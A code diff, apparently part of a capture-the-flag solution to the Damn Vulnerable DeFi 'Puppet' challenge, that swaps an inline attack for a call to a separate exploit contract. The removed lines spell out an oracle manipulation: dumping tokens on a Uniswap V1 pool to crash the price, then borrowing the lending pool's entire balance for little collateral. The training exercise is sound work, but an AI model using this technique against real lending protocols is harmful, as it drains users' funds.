@@ -3,8 +3,9 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {PuppetExploit} from "./PuppetExploit.sol";
 import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
+import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
 import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";
 
@@ -89,24 +90,14 @@ contract PuppetChallenge is Test {
     }
 
     function test_puppet() public checkSolvedByPlayer {
-        console.log("player eth", address(player).balance);
-        console.log("plaher dvt", token.balanceOf(player));
+        PuppetExploit exploit = new PuppetExploit{value: PLAYER_INITIAL_ETH_BALANCE}(
+            address(token), address(uniswapV1Exchange), address(lendingPool), recovery
+        );
 
-        token.approve(address(uniswapV1Exchange), 1000 ether);
-        uniswapV1Exchange.tokenToEthSwapInput(1000 ether, 1, block.timestamp + 1);
-        console.log("________________________________________________________________________");
+        // contract addr requires player tokens to run the exploit
+        token.transfer(address(exploit), token.balanceOf(address(player)));
 
-        console.log("player eth", address(player).balance);
-        console.log("plaher dvt", token.balanceOf(player));
-
-        console.log("ETH in Uniswap:", address(uniswapV1Exchange).balance);
-        console.log("Token in Uniswap:", token.balanceOf(address(uniswapV1Exchange)));
-        console.log("Oracle Price:", lendingPool.calculateDepositRequired(100_000e18) / 1e18);
-
-        lendingPool.borrow{value: lendingPool.calculateDepositRequired(100_000e18)}(100_000e18, address(player));
-        token.transfer(address(recovery), token.balanceOf(address(player)));
-
-        console.log("plaher dvt", token.balanceOf(player));
+        exploit.run();
     }
 
     // Utility function to calculate Uniswap prices
@@ -123,7 +114,7 @@ contract PuppetChallenge is Test {
      */
     function _isSolved() private view {
         // Player executed a single transaction
-        // assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
+        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
 
         // All tokens of the lending pool were deposited into the recovery account
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
